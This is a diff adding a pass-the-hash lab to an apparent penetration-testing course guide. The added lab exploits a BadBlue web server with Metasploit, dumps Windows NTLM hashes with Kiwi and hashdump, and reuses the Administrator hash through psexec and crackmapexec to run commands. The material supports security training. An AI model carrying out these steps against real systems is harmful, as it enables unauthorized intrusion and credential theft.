@@ -314,5 +314,135 @@ mimikatz # sekurlsa::logonPasswords
 
 <figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
+***
+
+## Lab 3 - Pass-the-hash <a href="#lab-3-pass-the-hash" id="lab-3-pass-the-hash"></a>
+
+> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340) - same lab as Lab 2
+>
+> * Target IP changed: `10.0.19.45`
+> * Use **Pass-the-hash** attack
+> * Both Kali Machine and Attacker/Victim Windows machine are provided
+
+### Enumeration <a href="#enumeration-and-exploitation-1" id="enumeration-and-exploitation-1"></a>
+
+```bash
+nmap 10.0.19.45
+```
+
+```bash
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-08 20:03 IST
+Nmap scan report for 10.0.19.45
+Host is up (0.0018s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
+```
+
+```bash
+nmap -sV -p80 10.0.19.45
+```
+
+```bash
+PORT   STATE SERVICE VERSION
+80/tcp open  http    BadBlue httpd 2.7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+### Exploitation
+
+```bash
+msfconsole -q
+msf6 > search badblue
+msf6 > use exploit/windows/http/badblue_passthru
+msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.19.45
+msf6 exploit(windows/http/badblue_passthru) > exploit
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>
+
+### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi-1" id="hash-dumping-kiwi-1"></a>
+
+```bash
+load kiwi
+lsa_dump_sam
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
+
+> 📌 Save users NTLM hashes in a text file for future use
+>
+> `Administrator: e3c61a68f1b89ee6c8ba9507378dc88d`
+>
+> `student: bd4ca1fbe028f3c5066467a7f6a73b0b`
+
+### Pass-the-hash PSExec <a href="#pass-the-hash-psexec" id="pass-the-hash-psexec"></a>
+
+```bash
+hashdump
+```
+
+```bash
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+
+* LM+NTLM hash is necessary, so copy the string:
+
+`aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`
+
+* **Use PSExec to login with `Administrator` user and its password hashes**
+
+<figure><img src="../../../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+meterpreter > background
+msf6 exploit(windows/http/badblue_passthru) > search psexec
+msf6 exploit(windows/http/badblue_passthru) > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > options
+msf6 exploit(windows/smb/psexec) > sessions 
+msf6 exploit(windows/smb/psexec) > set LPORT 4422
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.19.45
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+msf6 exploit(windows/smb/psexec) > exploit
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+crackmapexec smb 10.0.19.45 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+crackmapexec smb 10.0.19.45 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
 
 
